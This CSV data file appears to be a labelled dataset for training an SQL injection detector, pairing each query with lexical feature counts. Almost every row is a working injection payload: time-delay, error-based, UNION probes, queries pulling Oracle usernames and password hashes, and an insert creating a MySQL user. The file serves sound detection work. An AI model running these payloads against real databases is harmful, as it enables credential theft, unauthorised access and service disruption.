Query,Data,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
1  )   where 5025  =  5025,0,0,0,1,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
1' rlike sleep  (  5  )  #,0,1,0,3,0,0,7,1,1,0,1,1,0,0,0,0,1,0,10,2,1,1
1'||  (  select 'fjlg' from dual where 9517  =  9517,0,3,0,4,0,0,10,1,0,0,0,3,0,0,0,0,0,1,23,9,3,1
1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--,0,3,0,6,0,0,14,2,0,0,2,8,0,0,0,0,0,1,26,17,3,1
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""qcqx"" like ""qcqx",0,0,4,12,0,0,16,3,1,0,4,4,0,0,0,0,1,0,25,2,4,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""mubt""  =  ""mubt",0,0,3,13,0,0,20,2,3,0,2,4,0,0,0,0,0,1,80,3,3,1
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",0,4,0,29,0,0,45,3,5,0,4,12,1,0,0,0,0,0,63,24,4,1
1'  )   as scnn where 9274  =  9274,0,1,0,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
" select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1",0,0,2,5,1,0,18,3,0,0,2,8,0,0,0,1,0,1,26,5,2,1
-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,0,0,0,2,0,0,12,1,1,0,1,4,0,0,0,0,0,0,13,20,0,1
1   )    )    as dgso where 4654  =  4654 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,0,0,0,38,0,0,81,2,4,0,2,27,0,0,0,0,0,1,86,53,0,1
"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",0,1,0,7,0,0,12,5,0,0,1,4,0,0,0,0,0,2,29,32,1,1
1'+  (  select 'vjoj' where 5348  =  5348,0,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
1   )    )     )   union all select null#,0,0,0,3,0,0,8,4,0,0,1,1,1,0,0,0,0,1,18,1,0,1
1 and 8398  =  1891-- naov,0,0,0,2,1,0,6,1,0,0,2,5,0,0,0,0,0,0,7,9,0,1
23 or 1  =  1; --,0,0,0,3,0,0,6,1,0,0,1,4,0,0,0,0,0,0,2,4,0,1
-4901  )   or 3407  =  6442#,0,0,0,2,0,0,6,1,0,0,1,3,0,0,0,0,0,0,2,12,0,1
"1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,0,10,0,0,22,2,0,0,2,7,0,0,0,0,0,1,37,21,0,1
1   )    )    as hxzh where 9284  =  9284,0,0,0,2,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,0,1
"1,  (  case when 5514  =  9602 then 1 else null end  )  ",0,0,0,3,0,0,13,0,1,0,0,1,1,0,0,0,0,0,23,10,0,1
1  )   where 1333  =  1333 order by 1--,0,0,0,3,0,0,9,2,0,0,1,4,0,0,0,0,0,0,12,10,0,1
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",0,1,0,17,0,0,22,3,1,0,1,2,0,3,0,0,0,2,33,39,1,1
-7565%'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',0,4,0,41,0,0,78,4,13,2,4,19,0,0,0,0,0,1,80,50,4,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'ufbr'  =  'ufbr",0,3,0,16,0,0,23,3,2,0,4,5,1,0,0,0,0,1,49,14,3,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",0,3,0,16,0,0,35,8,1,0,8,11,0,0,0,3,0,2,117,2,3,1
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",0,6,0,17,0,0,17,5,3,0,4,4,0,0,0,2,0,1,66,3,6,1
"1%'   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  '%'  =  '",0,4,0,34,0,0,54,13,2,2,9,15,0,2,0,0,0,3,100,35,4,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  3770  =  3770",0,0,0,8,0,0,18,6,3,0,6,8,0,0,0,0,0,1,65,11,0,1
"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1,0,11,0,0,19,7,0,0,7,11,0,0,0,5,0,1,63,10,1,1
"1%'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",0,1,0,12,0,0,20,7,0,1,7,12,0,0,0,5,0,1,63,10,1,1
s,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1
"1""  )   as qmtx where 5280  =  5280 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,0,1,14,0,0,35,2,8,0,1,6,0,0,0,7,0,1,119,20,1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",0,3,0,16,0,0,35,9,3,0,9,12,0,0,0,1,0,2,113,2,3,1
"1""  )   as uorp where 7208  =  7208",0,0,1,2,0,0,8,1,1,0,1,2,0,0,0,0,0,0,11,9,1,1
"1   )    )     )   union all select null,null#",0,0,0,4,0,0,8,4,0,0,1,1,2,0,0,0,0,1,22,1,0,1
"1' where 8803  =  8803 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,0,13,0,0,32,2,7,0,1,6,0,0,0,7,0,1,113,20,1,1
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",0,4,0,11,0,0,25,3,4,0,3,6,0,0,0,0,0,1,82,9,4,1
"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",0,0,1,7,0,0,13,3,0,0,1,6,0,0,0,0,0,0,14,24,1,1
"1  )   as ewnv where 3393  =  3393 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,0,0,13,0,0,35,2,8,0,2,7,0,0,0,7,0,1,120,20,0,1
"-9557%""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,0,0,4,42,0,0,79,3,2,2,3,29,0,0,0,0,0,1,93,48,4,1
"-1258""   )    )    union all select 7734,7734,7734#",0,0,1,6,0,0,7,4,0,0,1,2,0,0,0,0,0,1,14,16,1,1
"iif  (  9190  =  5059,1,1/0  )  ",0,0,0,4,0,0,6,0,0,0,0,2,0,0,0,0,0,0,3,11,0,1
"-6457 where 1764  =  1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",0,0,0,10,0,0,9,4,0,0,1,5,0,0,0,0,0,1,19,44,0,1
"1""  )   as advz where 5166  =  5166 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,1,11,0,0,24,2,1,0,1,6,0,0,0,0,0,1,42,21,1,1
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",0,1,0,7,0,0,12,1,0,0,1,2,0,1,0,0,0,0,15,21,1,1
select * from users where id  =  1.%@ or 1  =  1 -- 1,0,0,0,3,1,0,14,2,0,1,1,7,0,0,0,1,0,1,24,4,0,1
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",0,0,1,9,0,0,18,3,1,1,1,3,0,0,0,0,1,2,30,2,1,1
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",0,0,4,23,0,0,29,3,1,0,3,5,0,3,0,0,0,1,47,35,4,1
-6665'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'winx'  =  'winx,0,4,0,49,0,0,97,6,1,0,5,35,0,0,0,0,0,2,111,54,4,1
"1%'   )    )    union all select null,null#",0,1,0,4,0,0,7,4,0,1,1,2,2,0,0,0,0,1,22,1,1,1
-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,0,0,0,7,0,0,16,2,0,0,3,7,0,0,0,0,0,0,5,24,0,1
"-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",0,1,0,12,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,44,1,1
"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,1,25,0,0,39,2,5,0,2,11,1,0,0,0,0,0,52,27,1,1
"1""  )   union all select null,null,null,null,null,null,null,null,null#",0,0,1,10,0,0,6,4,0,0,1,1,9,0,0,0,0,1,50,1,1,1
1'   )    )     )   waitfor delay '0:0:5'--,0,3,0,10,0,0,7,1,1,0,1,3,0,0,0,0,1,0,12,4,3,1
"1%""  )   union all select null,null,null,null,null,null,null--",0,0,1,10,0,0,6,4,0,1,1,4,7,0,0,0,0,1,42,1,1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""cwat"" like ""cwat",0,0,3,15,0,0,22,4,2,0,5,5,1,0,0,0,0,1,53,14,3,1
1' in boolean mode  )   and 4595  =  4595#,0,1,0,2,0,0,9,2,0,0,3,4,0,0,0,0,0,0,16,9,1,1
select case when 4488  =  5522 then 1 else null end--,0,0,0,2,0,0,11,1,1,0,0,3,1,0,0,0,0,1,29,9,0,1
"1"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,1,10,0,0,17,2,0,0,2,6,0,0,0,0,0,1,32,13,1,1
select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',0,3,0,5,1,0,16,2,0,1,1,9,0,0,0,1,0,1,24,4,3,1
"iif  (  2205  =  4764,1,1/0  )  ",0,0,0,4,0,0,6,0,0,0,0,2,0,0,0,0,0,0,3,11,0,1
 or 1  =  1 --,0,0,0,2,0,0,6,1,0,0,1,4,0,0,0,0,0,0,2,2,0,1
"1""  )   order by 1--",0,0,1,4,0,0,5,2,0,0,1,3,0,0,0,0,0,0,7,2,1,1
"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",0,4,0,9,0,0,14,2,0,0,4,6,0,0,0,0,0,0,17,13,4,1
"1""  )   as yggn where 1006  =  1006 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",0,0,1,21,0,0,39,1,3,0,0,4,0,3,0,0,0,1,77,45,1,1
"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,0,0,4,13,0,0,19,2,1,2,4,8,0,0,0,0,1,0,14,10,4,1
"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",0,2,0,40,0,0,76,3,8,0,1,15,2,0,0,0,0,2,119,43,2,1
"-9583'   )    )    union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",0,1,0,13,0,0,7,4,0,0,1,2,0,0,0,0,0,1,14,44,1,1
"-1763%"" or   (  8459  =  8459  )  *4906 and ""%""  =  """,0,0,4,7,0,0,12,2,0,2,3,9,0,0,0,0,0,0,5,16,4,1
-2749'  )   as fiho where 3531  =  3531 or 2777  =  1485#,0,1,0,3,0,0,12,1,1,0,1,4,0,0,0,0,0,0,13,20,1,1
"1'  )   as bfgl where 8959  =  8959 union all select null,null,null,null,null,null,null,null,null,null--",0,1,0,13,0,0,12,4,1,0,1,4,10,0,0,0,0,1,65,9,1,1
"1  )   union all select null,null,null,null,null,null--",0,0,0,8,0,0,6,4,0,0,1,3,6,0,0,0,0,1,38,1,0,1
"1',  (  select   (  case when   (  2073  =  5314  )   then 1 else 1/  (  select 0  )   end   )    )   ",0,1,0,10,0,0,22,2,1,0,0,2,0,0,0,0,0,2,31,12,1,1
"1"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,1,29,0,0,48,2,7,0,2,15,2,0,0,0,0,0,71,25,1,1
"1  )   where 8474  =  8474 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,0,0,13,0,0,33,2,7,0,1,6,0,0,0,7,0,1,113,20,0,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",0,3,0,16,0,0,35,8,1,0,8,11,0,0,0,3,0,2,117,2,3,1
"admin""  )   or ""1""  =  ""1""/*",0,0,5,6,0,1,6,2,0,0,2,5,0,0,0,1,0,0,7,2,5,1
"iif  (  7011  =  2522,1,1/0  )  ",0,0,0,4,0,0,6,0,0,0,0,2,0,0,0,0,0,0,3,11,0,1
"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,0,1,8,0,0,14,1,1,1,1,3,0,0,0,0,1,0,10,10,1,1
"1""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""nrhz"" like ""nrhz",0,0,4,20,0,0,37,4,7,0,4,6,0,0,0,7,0,1,123,12,4,1
"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",0,1,0,12,0,0,13,4,1,0,1,5,0,0,0,0,0,1,25,40,1,1
"1' union all select null,null,null,null,null,null,null,null,null,null--",0,1,0,12,0,0,5,4,0,0,1,3,10,0,0,0,0,1,54,1,1,1
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq",0,0,4,20,0,0,26,5,1,0,5,6,0,3,0,0,0,2,49,39,4,1
distinct,0,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,0,8,0,0,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'yqrt' like 'yqrt",0,3,0,22,0,0,34,4,4,0,5,9,2,0,0,0,0,1,72,16,3,1
-4184'   )    )     )   or 2579  =  4654#,0,1,0,5,0,0,8,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",0,0,0,3,1,0,20,4,1,0,0,7,1,0,0,1,0,2,66,4,0,1
"1  )   as adzj where 5575  =  5575 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,0,0,10,0,0,24,2,1,0,1,6,0,0,0,0,0,1,42,21,0,1
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",0,3,0,9,0,0,12,5,0,0,1,6,4,0,0,0,0,2,45,9,3,1
"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",0,0,1,22,0,0,39,4,2,0,1,6,0,3,0,0,0,3,54,40,1,1
1' and   (  3020  =  3020  )  *6703 and 'qsrz'  =  'qsrz,0,4,0,6,0,0,12,2,0,0,4,7,0,0,0,0,0,0,14,13,4,1
"-7139""  )   where 2723  =  2723 or 3900  =  5082--",0,0,1,5,0,0,10,1,0,0,1,6,0,0,0,0,0,0,7,20,1,1
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",0,1,0,38,0,0,71,1,3,0,0,21,0,0,0,0,0,1,72,41,1,1
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'hyun' like 'hyun,0,4,0,10,0,0,23,4,1,0,4,5,0,1,0,0,0,1,46,13,4,1
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,0,1,0,9,0,0,17,3,1,0,1,2,0,0,0,0,1,2,30,2,1,1
"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm",0,4,0,26,0,0,39,6,1,0,5,7,0,3,0,0,0,3,59,32,4,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,0,2,3,14,0,0,18,4,1,1,5,8,0,0,0,0,0,1,38,10,5,1
"-7950 where 9619  =  9619 union all select 9619,9619,9619,9619--",0,0,0,6,0,0,9,4,0,0,1,5,0,0,0,0,0,1,19,28,0,1
1 and sleep  (  5  ) ,0,0,0,2,0,0,6,1,1,0,2,2,0,0,0,0,1,0,8,2,0,1
"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",0,0,0,7,0,0,16,1,0,0,2,6,0,1,0,0,0,0,20,30,0,1
-3582'  )   or 6872  =  6872 and   (  'gyfj'  =  'gyfj,0,4,0,7,0,0,11,2,0,0,3,6,0,0,0,0,0,0,13,12,4,1
"1"" where 7344  =  7344 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",0,0,1,11,0,0,22,3,1,0,1,5,0,0,0,0,1,2,35,10,1,1
"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",0,1,0,8,0,0,8,4,0,1,1,3,0,0,0,0,0,1,14,20,1,1
"1""   )    )    as vbdo where 3882  =  3882",0,0,1,3,0,0,9,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
select * from users where id  =  1 <@$ or 1  =  1 -- 1,0,0,0,2,1,0,15,2,0,0,1,7,0,0,0,1,0,1,24,4,0,1
"1 union all select null,null,null,null,null,null,null,null,null,null#",0,0,0,9,0,0,5,4,0,0,1,1,10,0,0,0,0,1,54,1,0,1
" select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",0,0,0,6,1,0,16,4,1,0,0,6,1,0,0,1,0,2,44,2,0,1
1 where 2301  =  2301,0,0,0,0,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'tqvy' like 'tqvy",0,4,0,12,0,0,22,9,0,0,10,12,0,0,0,5,0,1,78,10,4,1
"1' in boolean mode  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,1,0,16,0,0,29,2,0,0,3,12,0,0,0,0,0,0,50,15,1,1
-5134   )    )     )   or 8571  =  8571--,0,0,0,6,0,0,8,1,0,0,1,5,0,0,0,0,0,0,2,12,0,1
"1  )   where 5378  =  5378 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",0,0,0,27,0,0,45,5,1,0,2,8,0,3,0,0,0,4,54,79,0,1
"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",0,1,0,6,0,0,12,1,0,1,2,4,0,1,0,0,0,0,16,21,1,1
"-1573""  )   union all select 3928,3928,3928,3928--",0,0,1,8,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,20,1,1
"-2007%'   )    )    union all select 7298,7298,7298#",0,1,0,6,0,0,7,4,0,1,1,3,0,0,0,0,0,1,14,16,1,1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,0,3,0,13,0,0,22,6,0,0,7,9,0,0,0,0,0,1,80,1,3,1
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",0,4,0,36,0,0,66,17,1,0,6,11,0,2,0,0,0,6,109,55,4,1
"-3555'  )   or make_set  (  9354  =  9354,7185  )   and   (  'papr'  =  'papr",0,4,0,10,0,0,14,4,0,0,3,6,0,0,0,0,0,0,20,16,4,1
""" or """"*""",0,0,4,4,0,0,3,1,0,0,1,2,0,0,0,0,0,0,2,0,4,1
"1"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,2,1,14,0,0,18,3,1,0,4,8,0,0,0,0,0,0,31,15,3,1
1' where 4460  =  4460,0,1,0,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
1  )   as jtfx where 8038  =  8038,0,0,0,1,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,0,1
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'narn'  =  'narn",0,4,0,20,0,0,37,3,7,0,3,6,0,0,0,7,0,1,119,12,4,1
"1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",0,1,0,16,0,0,32,1,1,0,1,11,0,0,0,0,0,0,47,24,1,1
"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,0,0,4,12,0,0,16,2,1,2,3,6,0,0,0,0,1,0,13,2,4,1
select   (  case when   (  6652  =  1932  )   then 6652 else 6652*  (  select 6652 from information_schema.character_sets  )   end  )  #,0,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,1,0,16,0,0,26,1,0,1,2,12,0,0,0,0,0,0,37,15,1,1
"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",0,0,0,25,0,0,45,3,5,0,5,13,1,0,0,0,0,0,56,35,0,1
"1"" order by 1--",0,0,1,3,0,0,4,2,0,0,1,3,0,0,0,0,0,0,7,2,1,1
" select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",0,3,0,9,1,0,18,4,1,0,0,5,0,0,0,1,0,2,40,4,3,1
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",0,4,0,11,0,0,17,2,0,0,3,5,0,1,0,0,0,0,26,21,4,1
-9562' or 8571  =  8571--,0,1,0,4,0,0,5,1,0,0,1,5,0,0,0,0,0,0,2,12,1,1
-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,0,0,0,39,0,0,80,4,13,0,4,17,0,0,0,0,0,1,80,58,0,1
select   (  case when   (  9986  =  8342  )   then 9986 else 9986*  (  select 9986 from information_schema.character_sets  )   end  )  #,0,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",0,0,1,9,0,0,6,4,0,1,1,3,0,0,0,0,0,1,14,32,1,1
